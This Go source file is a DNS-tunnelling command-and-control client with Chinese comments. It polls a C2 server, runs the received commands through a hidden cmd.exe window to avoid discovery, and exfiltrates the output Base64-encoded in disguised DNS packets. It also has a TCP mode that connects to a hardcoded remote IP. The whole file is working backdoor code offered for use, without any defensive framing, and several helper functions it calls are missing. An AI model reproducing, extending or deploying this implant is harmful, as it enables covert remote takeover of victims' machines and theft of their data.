/*
DNS伪装客户端 - 与C2服务器进行伪装通信

通信流程：
1. 建立TCP连接到C2服务器
2. 发送客户端标识符 'A'
3. 接收DNS伪装的命令消息
4. 解析DNS查询，提取实际命令
5. 执行命令并获取结果
6. 将结果封装成DNS响应发送回服务器

DNS伪装特点：
- 所有命令通过DNS查询包接收
- 所有结果通过DNS响应包发送
- 使用Base64编码确保数据安全传输
- 完全模拟正常DNS流量特征
*/

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// DNS消息结构定义，与服务器端保持一致
type DNSHeader struct {
	ID      uint16 // 会话标识符
	Flags   uint16 // 标志位
	QDCount uint16 // 查询数量
	ANCount uint16 // 回答数量
	NSCount uint16 // 权威记录数量
	ARCount uint16 // 附加记录数量
}

// DNS查询类型常量
const (
	DNS_TYPE_A     = 1  // A记录
	DNS_TYPE_AAAA  = 28 // AAAA记录
	DNS_TYPE_CNAME = 5  // CNAME记录
	DNS_TYPE_TXT   = 16 // TXT记录 - 用于传输命令和数据
	DNS_CLASS_IN   = 1  // Internet类
)

// DNS标志位定义
const (
	DNS_FLAG_QR = 0x8000 // 查询(0)/响应(1)
	DNS_FLAG_AA = 0x0400 // 权威回答
	DNS_FLAG_RD = 0x0100 // 递归期望
	DNS_FLAG_RA = 0x0080 // 递归可用
)

// DNS隧道常量
const (
	DNS_SERVER = "127.0.0.1:54321" // C2服务器的DNS端口 - 本地测试
	// DNS_SERVER         = "101.200.236.51:54321" // C2服务器的DNS端口 - 远程服务器
	HEARTBEAT_INTERVAL = 3 * time.Second
	DNS_TIMEOUT        = 10 * time.Second

	// DNS伪装相关常量
	DNS_MAX_PAYLOAD    = 512            // DNS UDP最大载荷
	DNS_DOMAIN_SUFFIX  = ".example.com" // 伪装域名后缀
	COMMAND_SUBDOMAIN  = "cmd"          // 命令子域名
	RESPONSE_SUBDOMAIN = "resp"         // 响应子域名
)

// DNS隧道模式 - 真正的双向DNS通信
func startDNSTunnelMode() {
	fmt.Printf("启动DNS隧道模式，DNS服务器: %s\n", DNS_SERVER)
	fmt.Println("Wireshark能抓到真正的DNS包...")

	for {
		// 1. 发送DNS心跳查询，检查是否有新命令
		fmt.Printf("[DNS隧道] 发送心跳查询...\n")
		command, err := queryCommandFromDNS()
		if err != nil {
			fmt.Printf("DNS查询失败: %v\n", err)
			time.Sleep(HEARTBEAT_INTERVAL)
			continue
		}

		// 2. 如果收到命令，执行并返回结果
		if command != "" {
			fmt.Printf("通过DNS隧道收到命令: %s\n", command)

			// 执行命令
			result := executeCommand(command)
			fmt.Printf("[DNS隧道] 命令执行结果长度: %d 字符\n", len(result))

			// 3. 通过DNS隧道发送结果
			err = sendResultThroughDNS(result)
			if err != nil {
				fmt.Printf("通过DNS发送结果失败: %v\n", err)
			} else {
				fmt.Printf("[DNS隧道] 结果发送完成\n")
			}
		} else {
			fmt.Printf("[DNS隧道] 无新命令，等待下次心跳...\n")
		}

		// 心跳间隔
		time.Sleep(HEARTBEAT_INTERVAL)
	}
}

// 通过DNS查询获取命令
func queryCommandFromDNS() (string, error) {
	// 建立UDP连接到DNS服务器
	fmt.Printf("[DNS隧道] 尝试连接DNS服务器: %s\n", DNS_SERVER)
	conn, err := net.Dial("udp", DNS_SERVER)
	if err != nil {
		return "", fmt.Errorf("连接DNS服务器失败: %w", err)
	}
	defer conn.Close()

	// 创建心跳DNS查询
	queryID := generateDNSID()
	heartbeatDomain := fmt.Sprintf("heartbeat.%s%s", COMMAND_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	dnsQuery := createDNSQuery(queryID, heartbeatDomain, DNS_TYPE_TXT)

	fmt.Printf("[DNS隧道] 发送DNS查询: %s (查询ID: %d, 包长度: %d 字节)\n",
		heartbeatDomain, queryID, len(dnsQuery))

	// 发送DNS查询
	conn.SetWriteDeadline(time.Now().Add(DNS_TIMEOUT))
	n, err := conn.Write(dnsQuery)
	if err != nil {
		return "", fmt.Errorf("发送DNS查询失败: %w", err)
	}
	fmt.Printf("[DNS隧道] 成功发送 %d 字节到 %s\n", n, DNS_SERVER)

	// 读取DNS响应
	conn.SetReadDeadline(time.Now().Add(DNS_TIMEOUT))
	responseBuffer := make([]byte, 1024)
	n, err = conn.Read(responseBuffer)
	if err != nil {
		return "", fmt.Errorf("读取DNS响应失败: %w", err)
	}

	response := responseBuffer[:n]
	fmt.Printf("[DNS隧道] 收到DNS响应: %d 字节\n", len(response))

	// 解析DNS响应，提取命令
	command, err := extractCommandFromDNSResponse(response)
	if err != nil {
		return "", fmt.Errorf("解析DNS响应失败: %w", err)
	}

	return command, nil
}

// 通过DNS隧道发送结果
func sendResultThroughDNS(result string) error {
	// 将结果转换为UTF-8并进行Base64编码
	utf8Result := []byte(result)
	encodedResult := base64.URLEncoding.EncodeToString(utf8Result)

	fmt.Printf("[DNS隧道] 准备发送结果 - 原始: %d 字节, Base64: %d 字符\n",
		len(utf8Result), len(encodedResult))

	// 检查是否需要分块传输
	const maxDNSPayload = 200 // DNS域名长度限制
	if len(encodedResult) <= maxDNSPayload {
		// 小数据，单次发送
		return sendSingleResultThroughDNS(encodedResult)
	} else {
		// 大数据，分块发送
		return sendChunkedResultThroughDNS(encodedResult)
	}
}

// 发送单个结果 - 使用特殊TXT查询传输数据
func sendSingleResultThroughDNS(encodedData string) error {
	conn, err := net.Dial("udp", DNS_SERVER)
	if err != nil {
		return fmt.Errorf("连接DNS服务器失败: %w", err)
	}
	defer conn.Close()

	// 构造结果域名，使用固定格式，数据通过特殊方式传输
	resultDomain := fmt.Sprintf("result.%s%s", RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	queryID := generateDNSID()

	// 创建特殊的DNS查询，将Base64数据编码到查询中
	dnsQuery := createDNSQueryWithData(queryID, resultDomain, encodedData)

	fmt.Printf("[DNS隧道] 发送单个结果查询，数据长度: %d\n", len(encodedData))

	// 发送DNS查询
	conn.SetWriteDeadline(time.Now().Add(DNS_TIMEOUT))
	_, err = conn.Write(dnsQuery)
	if err != nil {
		return fmt.Errorf("发送DNS结果查询失败: %w", err)
	}

	// 等待确认响应（可选）
	conn.SetReadDeadline(time.Now().Add(DNS_TIMEOUT))
	responseBuffer := make([]byte, 512)
	_, err = conn.Read(responseBuffer)
	if err != nil {
		fmt.Printf("[DNS隧道] 读取确认响应失败: %v\n", err)
		// 不返回错误，因为数据可能已经发送成功
	}

	return nil
}

// 发送分块结果
func sendChunkedResultThroughDNS(encodedData string) error {
	const chunkSize = 180 // 保留域名结构的空间
	// 使用Base64对齐的分块函数
	chunks := splitBase64IntoChunks(encodedData, chunkSize)
	totalChunks := len(chunks)

	fmt.Printf("[DNS隧道] 分块发送，总块数: %d\n", totalChunks)

	for i, chunk := range chunks {
		chunkIndex := i + 1

		conn, err := net.Dial("udp", DNS_SERVER)
		if err != nil {
			return fmt.Errorf("连接DNS服务器失败(分块%d): %w", chunkIndex, err)
		}

		// 构造分块域名，使用固定格式
		chunkDomain := fmt.Sprintf("chunk%dof%d.%s%s",
			chunkIndex, totalChunks, RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)

		queryID := generateDNSID()
		// 创建包含分块数据的DNS查询（附加记录方式）
		dnsQuery := createDNSQueryWithData(queryID, chunkDomain, chunk)

		fmt.Printf("[DNS隧道] 发送分块 %d/%d 查询，数据长度: %d\n",
			chunkIndex, totalChunks, len(chunk))

		// 发送DNS查询
		conn.SetWriteDeadline(time.Now().Add(DNS_TIMEOUT))
		_, err = conn.Write(dnsQuery)
		conn.Close()

		if err != nil {
			return fmt.Errorf("发送分块 %d/%d 失败: %w", chunkIndex, totalChunks, err)
		}

		// 分块间延迟
		if chunkIndex < totalChunks {
			time.Sleep(200 * time.Millisecond)
		}
	}

	return nil
}

// 创建标准DNS查询包
func createDNSQuery(queryID uint16, domain string, queryType uint16) []byte {
	var dnsQuery []byte

	// DNS头部 (12字节)
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], queryID) // 事务ID
	binary.BigEndian.PutUint16(header[2:4], 0x0100)  // 标准查询，期望递归
	binary.BigEndian.PutUint16(header[4:6], 1)       // 查询数量: 1
	binary.BigEndian.PutUint16(header[6:8], 0)       // 回答数量: 0
	binary.BigEndian.PutUint16(header[8:10], 0)      // 权威数量: 0
	binary.BigEndian.PutUint16(header[10:12], 0)     // 附加数量: 0
	dnsQuery = append(dnsQuery, header...)

	// 查询部分
	// 编码域名
	encodedDomain := encodeDomainName(domain)
	dnsQuery = append(dnsQuery, encodedDomain...)

	// 查询类型和类别
	queryInfo := make([]byte, 4)
	binary.BigEndian.PutUint16(queryInfo[0:2], queryType)    // 查询类型
	binary.BigEndian.PutUint16(queryInfo[2:4], DNS_CLASS_IN) // 查询类别: IN
	dnsQuery = append(dnsQuery, queryInfo...)

	return dnsQuery
}

// createDNSQueryWithData 创建包含数据的DNS查询，将Base64数据编码到DNS查询的附加记录中
func createDNSQueryWithData(queryID uint16, domain string, base64Data string) []byte {
	// 创建DNS查询头部
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], queryID) // 事务ID
	binary.BigEndian.PutUint16(header[2:4], 0x0100)  // 标准查询，期望递归
	binary.BigEndian.PutUint16(header[4:6], 1)       // 查询数量: 1
	binary.BigEndian.PutUint16(header[6:8], 0)       // 回答数量: 0
	binary.BigEndian.PutUint16(header[8:10], 0)      // 权威数量: 0
	binary.BigEndian.PutUint16(header[10:12], 1)     // 附加数量: 1 (用于传输数据)

	var dnsQuery []byte
	dnsQuery = append(dnsQuery, header...)

	// 查询部分
	encodedDomain := encodeDomainName(domain)
	dnsQuery = append(dnsQuery, encodedDomain...)

	// 查询类型和类别
	queryInfo := make([]byte, 4)
	binary.BigEndian.PutUint16(queryInfo[0:2], DNS_TYPE_TXT) // 查询类型
	binary.BigEndian.PutUint16(queryInfo[2:4], DNS_CLASS_IN) // 查询类别: IN
	dnsQuery = append(dnsQuery, queryInfo...)

	// 附加记录部分，用于传输Base64数据
	// 附加记录名称（使用压缩指针指向查询域名）
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsQuery = append(dnsQuery, namePointer...)

	// 附加记录类型和类别
	dnsQuery = append(dnsQuery, queryInfo...)

	// TTL (生存时间)
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 0) // 设置为0表示不缓存
	dnsQuery = append(dnsQuery, ttl...)

	// 附加记录数据长度和内容
	txtRecordLength := len(base64Data) + 1 // +1 for length prefix
	dataLength := make([]byte, 2)
	binary.BigEndian.PutUint16(dataLength, uint16(txtRecordLength))
	dnsQuery = append(dnsQuery, dataLength...)

	// TXT记录内容：长度前缀 + Base64数据
	dnsQuery = append(dnsQuery, byte(len(base64Data)))
	dnsQuery = append(dnsQuery, []byte(base64Data)...)

	fmt.Printf("[DNS隧道] 创建DNS查询附加TXT记录，Base64数据长度: %d，DNS包长度: %d\n",
		len(base64Data), len(dnsQuery))

	return dnsQuery
}

// 从DNS响应中提取命令
func extractCommandFromDNSResponse(response []byte) (string, error) {
	if len(response) < 12 {
		return "", fmt.Errorf("DNS响应太短")
	}

	// 解析DNS头部
	header, err := decodeDNSHeader(response)
	if err != nil {
		return "", fmt.Errorf("解析DNS头部失败: %w", err)
	}

	fmt.Printf("[DNS隧道] DNS响应头部 - ID: %d, Flags: 0x%04X, AN: %d\n",
		header.ID, header.Flags, header.ANCount)

	// 检查是否为响应且有答案记录
	if header.Flags&DNS_FLAG_QR == 0 {
		return "", fmt.Errorf("不是DNS响应")
	}

	if header.ANCount == 0 {
		fmt.Printf("[DNS隧道] 无答案记录，没有待执行命令\n")
		return "", nil // 无命令
	}

	// 跳过查询部分，解析答案部分
	offset := 12 // DNS头部长度

	// 跳过查询部分
	for i := 0; i < int(header.QDCount); i++ {
		_, nextOffset, err := decodeDomainName(response, offset)
		if err != nil {
			return "", fmt.Errorf("跳过查询域名失败: %w", err)
		}
		offset = nextOffset + 4 // 域名 + 类型(2) + 类别(2)
	}

	// 解析第一个答案记录
	if offset+12 > len(response) {
		return "", fmt.Errorf("DNS答案部分数据不足")
	}

	// 跳过名称（压缩指针或完整域名）
	if response[offset]&0xC0 == 0xC0 {
		offset += 2 // 压缩指针
	} else {
		_, nextOffset, err := decodeDomainName(response, offset)
		if err != nil {
			return "", fmt.Errorf("解析答案域名失败: %w", err)
		}
		offset = nextOffset
	}

	// 读取类型、类别、TTL、数据长度
	if offset+10 > len(response) {
		return "", fmt.Errorf("DNS答案记录数据不足")
	}

	recordType := binary.BigEndian.Uint16(response[offset : offset+2])
	offset += 2
	offset += 2 // 跳过类别
	offset += 4 // 跳过TTL
	dataLength := binary.BigEndian.Uint16(response[offset : offset+2])
	offset += 2

	if recordType != DNS_TYPE_TXT {
		return "", fmt.Errorf("不是TXT记录，类型: %d", recordType)
	}

	if dataLength == 0 || offset+int(dataLength) > len(response) {
		return "", fmt.Errorf("TXT记录数据无效")
	}

	// 解析TXT记录
	txtData := response[offset : offset+int(dataLength)]
	if len(txtData) < 1 {
		return "", nil // 空TXT记录
	}

	txtLength := int(txtData[0])
	if txtLength == 0 || 1+txtLength > len(txtData) {
		return "", nil // 空命令
	}

	// 提取Base64编码的命令
	encodedCommand := string(txtData[1 : 1+txtLength])
	fmt.Printf("[DNS隧道] 从TXT记录提取Base64命令: %s\n", encodedCommand)

	// Base64解码为UTF-8命令
	decodedBytes, err := base64.URLEncoding.DecodeString(encodedCommand)
	if err != nil {
		return "", fmt.Errorf("解码Base64命令失败: %w", err)
	}

	command := string(decodedBytes)
	fmt.Printf("[DNS隧道] 解码命令成功: %s\n", command)

	return command, nil
}

func main() {
	fmt.Println("DNS隧道客户端 - 双向DNS隧道模式")
	fmt.Println("注意：Wireshark能抓到真正的DNS包")

	// 直接启动DNS隧道模式
	startDNSTunnelMode()
}

// 当前的TCP模式
func startTCPMode() {
	// 连接到C2服务器
	conn, err := net.Dial("tcp", "101.200.236.51:8080")
	if err != nil {
		fmt.Println("连接服务器失败:", err)
		return
	}
	defer conn.Close()

	// 发送客户端标识符，告诉服务器这是一个客户端连接
	_, err = conn.Write([]byte{'A'})
	if err != nil {
		fmt.Println("发送客户端标识符失败:", err)
		return
	}

	fmt.Println("已连接到C2服务器，开始DNS伪装通信循环（TCP模式）...")

	for {
		// 1. 发送DNS查询请求，询问是否有新命令
		fmt.Printf("[TCP模式] 发送DNS心跳查询，检查新命令...\n")
		command, err := sendDNSHeartbeatAndGetCommand(conn)
		if err != nil {
			fmt.Printf("DNS心跳查询失败: %v\n", err)
			// 如果是连接错误，尝试重连
			if isConnectionError(err) {
				fmt.Println("检测到连接断开，程序退出")
				break
			}
			// 等待一段时间后重试
			time.Sleep(5 * time.Second)
			continue
		}

		// 2. 如果收到命令，执行并返回结果
		if command != "" {
			fmt.Printf("收到DNS伪装命令: %s\n", command)

			// 执行命令
			result := executeCommand(command)
			fmt.Printf("[TCP模式] 命令执行结果长度: %d 字符\n", len(result))

			// 3. 将结果通过DNS查询发送回服务器（支持分块传输）
			err = sendDNSResultQuery(conn, result)
			if err != nil {
				fmt.Printf("发送DNS结果查询失败: %v\n", err)
				// 如果是连接错误，退出循环
				if isConnectionError(err) {
					fmt.Println("检测到连接断开，程序退出")
					break
				}
			} else {
				fmt.Printf("[TCP模式] 结果发送完成\n")
			}
		} else {
			fmt.Printf("[TCP模式] 无新命令，等待下次心跳...\n")
		}

		// 心跳间隔，避免过于频繁的查询
		time.Sleep(3 * time.Second)
	}
}

// readDNSCommand 从服务器读取DNS伪装的命令
func readDNSCommand(conn net.Conn) (string, error) {
	// 设置读取超时
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	_, err := conn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS消息长度失败: %w", err)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS消息长度: %d", messageLength)
	}

	fmt.Printf("[调试] DNS消息长度: %d 字节\n", messageLength)

	// 读取完整的DNS查询消息
	dnsData := make([]byte, messageLength)
	totalRead := 0
	for totalRead < int(messageLength) {
		n, err := conn.Read(dnsData[totalRead:])
		if err != nil {
			return "", fmt.Errorf("读取DNS查询数据失败(已读取%d/%d字节): %w", totalRead, messageLength, err)
		}
		totalRead += n
	}

	fmt.Printf("[调试] 成功读取DNS数据: %d 字节\n", totalRead)

	// 解析DNS查询，提取实际命令
	command, err := parseDNSQuery(dnsData)
	if err != nil {
		return "", fmt.Errorf("解析DNS查询失败: %w", err)
	}

	return command, nil
}

// sendDNSResponse 向服务器发送DNS伪装的响应
func sendDNSResponse(conn net.Conn, result string) error {
	// 创建DNS响应消息
	queryID := generateDNSID()
	dnsResponse := createDNSResponse(queryID, result)

	fmt.Printf("[调试] 创建DNS响应，原始结果长度: %d 字符，DNS包长度: %d 字节\n", len(result), len(dnsResponse))

	// 设置写入超时
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsResponse)))

	_, err := conn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS响应长度失败: %w", err)
	}

	// 发送DNS响应数据，确保完整发送
	totalWritten := 0
	for totalWritten < len(dnsResponse) {
		n, err := conn.Write(dnsResponse[totalWritten:])
		if err != nil {
			return fmt.Errorf("发送DNS响应数据失败(已发送%d/%d字节): %w", totalWritten, len(dnsResponse), err)
		}
		totalWritten += n
		fmt.Printf("[调试] 已发送 %d/%d 字节\n", totalWritten, len(dnsResponse))
	}

	fmt.Printf("[调试] 成功发送完整DNS响应: %d 字节\n", totalWritten)

	// 强制刷新输出缓冲区
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	return nil
}

// executeCommand 执行命令并返回结果
func executeCommand(commandStr string) string {
	commandStr = strings.TrimSpace(commandStr)
	if commandStr == "" {
		return "空命令"
	}

	// 处理cd命令
	if strings.HasPrefix(commandStr, "cd ") {
		dir := strings.TrimSpace(commandStr[3:])
		err := os.Chdir(dir)
		if err != nil {
			return fmt.Sprintf("切换目录失败: %v", err)
		} else {
			currentDir, _ := os.Getwd()
			return fmt.Sprintf("已切换到目录: %s", currentDir)
		}
	}

	// 执行系统命令
	cmd := exec.Command("cmd", "/C", commandStr)
	// 隐藏窗口，避免被发现
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()

	// 将Windows GBK编码的输出转换为UTF-8
	result := convertGBKToUTF8(output)

	if err != nil {
		return fmt.Sprintf("命令执行出错: %v\n输出:\n%s", err, result)
	} else {
		return result
	}
}

// convertGBKToUTF8 将GBK编码的字节转换为UTF-8字符串
func convertGBKToUTF8(gbkBytes []byte) string {
	// 如果是空数据，直接返回
	if len(gbkBytes) == 0 {
		return ""
	}

	fmt.Printf("[调试] 开始GBK转换 - 输入字节数: %d\n", len(gbkBytes))
	fmt.Printf("[调试] 输入数据前50字节: %v\n", func() []byte {
		if len(gbkBytes) > 50 {
			return gbkBytes[:50]
		}
		return gbkBytes
	}())

	// 尝试GBK到UTF-8转换
	decoder := simplifiedchinese.GBK.NewDecoder()
	utf8Bytes, _, err := transform.Bytes(decoder, gbkBytes)
	if err != nil {
		fmt.Printf("[调试] GBK转换失败: %v\n", err)
		// 如果转换失败，尝试其他方法

		// 检查是否已经是UTF-8
		if utf8.Valid(gbkBytes) {
			fmt.Printf("[调试] 数据已经是有效的UTF-8，直接使用\n")
			return string(gbkBytes)
		}

		// 如果不是有效UTF-8，尝试作为CP936处理
		decoder936 := simplifiedchinese.GB18030.NewDecoder()
		utf8Bytes, _, err2 := transform.Bytes(decoder936, gbkBytes)
		if err2 == nil {
			fmt.Printf("[调试] 使用GB18030成功转换\n")
			result := string(utf8Bytes)
			fmt.Printf("[调试] 转换完成 - 输出字符数: %d\n", len(result))
			return result
		}

		fmt.Printf("[调试] 所有转换方法均失败，使用原始字符串\n")
		return string(gbkBytes)
	}

	result := string(utf8Bytes)
	fmt.Printf("[调试] GBK到UTF-8转换成功 - 输入字节: %d，输出UTF-8字节: %d，字符数: %d\n",
		len(gbkBytes), len(utf8Bytes), len(result))

	// 验证转换结果的UTF-8有效性
	if !utf8.ValidString(result) {
		fmt.Printf("[调试] 警告：转换结果包含无效UTF-8字符\n")
		result = strings.ToValidUTF8(result, "?")
	}

	return result
}

// ==============================================
// DNS伪装工具函数
// ==============================================

// generateDNSID 生成随机的DNS消息ID
func generateDNSID() uint16 {
	var id [2]byte
	rand.Read(id[:])
	return binary.BigEndian.Uint16(id[:])
}

// encodeDNSHeader 将DNS头部结构体编码为字节数组
func encodeDNSHeader(header *DNSHeader) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint16(buf[0:2], header.ID)
	binary.BigEndian.PutUint16(buf[2:4], header.Flags)
	binary.BigEndian.PutUint16(buf[4:6], header.QDCount)
	binary.BigEndian.PutUint16(buf[6:8], header.ANCount)
	binary.BigEndian.PutUint16(buf[8:10], header.NSCount)
	binary.BigEndian.PutUint16(buf[10:12], header.ARCount)
	return buf
}

// decodeDNSHeader 从字节数组解码DNS头部结构体
func decodeDNSHeader(data []byte) (*DNSHeader, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("DNS头部数据不足，需要12字节，实际%d字节", len(data))
	}

	header := &DNSHeader{
		ID:      binary.BigEndian.Uint16(data[0:2]),
		Flags:   binary.BigEndian.Uint16(data[2:4]),
		QDCount: binary.BigEndian.Uint16(data[4:6]),
		ANCount: binary.BigEndian.Uint16(data[6:8]),
		NSCount: binary.BigEndian.Uint16(data[8:10]),
		ARCount: binary.BigEndian.Uint16(data[10:12]),
	}
	return header, nil
}

// encodeDomainName 将域名编码为DNS格式
func encodeDomainName(domain string) []byte {
	if domain == "" {
		return []byte{0}
	}

	parts := strings.Split(domain, ".")
	var result []byte

	for _, part := range parts {
		if len(part) > 63 {
			part = part[:63] // DNS标签最大63字符
		}
		result = append(result, byte(len(part)))
		result = append(result, []byte(part)...)
	}
	result = append(result, 0) // 域名结束标记
	return result
}

// decodeDomainName 从DNS格式解码域名
func decodeDomainName(data []byte, offset int) (string, int, error) {
	if offset >= len(data) {
		return "", offset, fmt.Errorf("域名数据偏移超界")
	}

	var parts []string
	originalOffset := offset

	for {
		if offset >= len(data) {
			return "", originalOffset, fmt.Errorf("域名数据不完整")
		}

		length := int(data[offset])
		offset++

		if length == 0 {
			break // 域名结束
		}

		// 检查是否为压缩指针
		if length&0xC0 == 0xC0 {
			if offset >= len(data) {
				return "", originalOffset, fmt.Errorf("压缩指针数据不完整")
			}
			// 这是一个压缩指针，跳过处理
			offset++
			break
		}

		if length > 63 {
			return "", originalOffset, fmt.Errorf("无效的域名标签长度: %d", length)
		}

		if offset+length > len(data) {
			return "", originalOffset, fmt.Errorf("域名标签数据不完整")
		}

		part := string(data[offset : offset+length])
		parts = append(parts, part)
		offset += length
	}

	domain := strings.Join(parts, ".")
	return domain, offset, nil
}

// parseDNSQuery 解析DNS响应消息，提取TXT记录中的命令数据
func parseDNSQuery(data []byte) (string, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", fmt.Errorf("解析DNS头部失败: %w", err)
	}

	fmt.Printf("[调试] DNS头部 - ID: %d, Flags: 0x%04X, QD: %d, AN: %d\n",
		header.ID, header.Flags, header.QDCount, header.ANCount)

	// 检查是否为DNS响应
	if header.Flags&DNS_FLAG_QR == 0 {
		return "", fmt.Errorf("不是DNS响应")
	}

	if header.ANCount == 0 {
		return "", fmt.Errorf("DNS响应没有回答记录")
	}

	// 跳过查询部分，解析回答部分
	offset := 12 // DNS头部长度

	// 跳过查询部分
	for i := 0; i < int(header.QDCount); i++ {
		// 跳过域名
		_, nextOffset, err := decodeDomainName(data, offset)
		if err != nil {
			return "", fmt.Errorf("跳过查询域名失败: %w", err)
		}
		offset = nextOffset + 4 // 域名 + 类型(2字节) + 类别(2字节)
	}

	// 解析回答部分的第一个记录
	if offset+12 > len(data) {
		return "", fmt.Errorf("DNS回答部分数据不足")
	}

	// 跳过名称（通常是压缩指针）
	if data[offset]&0xC0 == 0xC0 {
		offset += 2 // 压缩指针
	} else {
		// 完整域名
		_, nextOffset, err := decodeDomainName(data, offset)
		if err != nil {
			return "", fmt.Errorf("解析回答域名失败: %w", err)
		}
		offset = nextOffset
	}

	// 读取类型、类别、TTL
	if offset+10 > len(data) {
		return "", fmt.Errorf("DNS回答记录数据不足")
	}

	recordType := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2
	recordClass := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2
	offset += 4 // 跳过TTL

	// 读取数据长度
	dataLength := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2

	fmt.Printf("[调试] DNS记录 - 类型: %d, 类别: %d, 数据长度: %d\n", recordType, recordClass, dataLength)

	if recordType != DNS_TYPE_TXT {
		return "", fmt.Errorf("不是TXT记录，类型: %d", recordType)
	}

	if dataLength == 0 || offset+int(dataLength) > len(data) {
		return "", fmt.Errorf("TXT记录数据长度无效: %d", dataLength)
	}

	// 解析TXT记录数据
	txtData := data[offset : offset+int(dataLength)]

	// TXT记录格式：长度前缀 + 数据
	if len(txtData) == 0 {
		fmt.Printf("[调试] 收到空TXT记录，没有待执行命令\n")
		return "", nil // 空命令
	}

	if len(txtData) == 1 && txtData[0] == 0 {
		fmt.Printf("[调试] 收到长度为0的TXT记录，没有待执行命令\n")
		return "", nil // 空命令
	}

	txtLength := int(txtData[0])
	if txtLength == 0 {
		fmt.Printf("[调试] TXT记录内容长度为0，没有待执行命令\n")
		return "", nil // 空命令
	}

	if 1+txtLength > len(txtData) {
		return "", fmt.Errorf("TXT记录数据不完整，需要%d字节，实际%d字节", 1+txtLength, len(txtData))
	}

	encodedCommand := string(txtData[1 : 1+txtLength])
	fmt.Printf("[调试] 从TXT记录提取Base64数据: %s (长度: %d)\n", encodedCommand, len(encodedCommand))

	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
	decodedBytes, err := base64.URLEncoding.DecodeString(encodedCommand)
	if err != nil {
		return "", fmt.Errorf("解码命令失败: %w", err)
	}
	command := string(decodedBytes)
	fmt.Printf("[调试] Base64解码完成 - 输入长度: %d，输出UTF-8字节: %d，字符串: %s\n",
		len(encodedCommand), len(decodedBytes), command)

	return command, nil
}

// createDNSResponse 创建DNS响应消息，用于封装响应数据
// 支持大数据分块传输
func createDNSResponse(queryID uint16, responseData string) []byte {
	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      queryID,
		Flags:   DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA, // 响应标志
		QDCount: 1,                                                     // 原始查询
		ANCount: 1,                                                     // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 重构原始查询部分
	queryDomain := fmt.Sprintf("%s%s", RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	// 名称压缩指针指向查询部分的域名
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间) - 设置为300秒，模拟正常DNS响应
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// 处理大数据：使用多个TXT记录分块传输
	// 使用标准库Base64编码，确保UTF-8中文字符正确处理
	encodedResponse := base64.URLEncoding.EncodeToString([]byte(responseData))
	fmt.Printf("[调试] Base64编码 - 输入UTF-8字节: %d，输出长度: %d 字符\n",
		len([]byte(responseData)), len(encodedResponse))

	const maxTxtLength = 250 // 留一些余量，避免达到255限制

	if len(encodedResponse) <= maxTxtLength {
		// 小数据，单个TXT记录
		dataLength := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLength, uint16(len(encodedResponse)+1))
		dnsPacket = append(dnsPacket, dataLength...)

		// TXT记录数据 (长度前缀 + 数据)
		dnsPacket = append(dnsPacket, byte(len(encodedResponse)))
		dnsPacket = append(dnsPacket, []byte(encodedResponse)...)
	} else {
		// 大数据，分块传输
		fmt.Printf("[调试] 数据过大，需要分块传输\n")
		chunks := splitIntoChunks(encodedResponse, maxTxtLength)

		// 计算总数据长度
		totalDataLen := 0
		for _, chunk := range chunks {
			totalDataLen += len(chunk) + 1 // +1 for length prefix
		}

		dataLength := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLength, uint16(totalDataLen))
		dnsPacket = append(dnsPacket, dataLength...)

		// 添加所有分块
		for i, chunk := range chunks {
			fmt.Printf("[调试] 添加分块 %d/%d，长度: %d\n", i+1, len(chunks), len(chunk))
			dnsPacket = append(dnsPacket, byte(len(chunk)))
			dnsPacket = append(dnsPacket, []byte(chunk)...)
		}
	}

	return dnsPacket
}

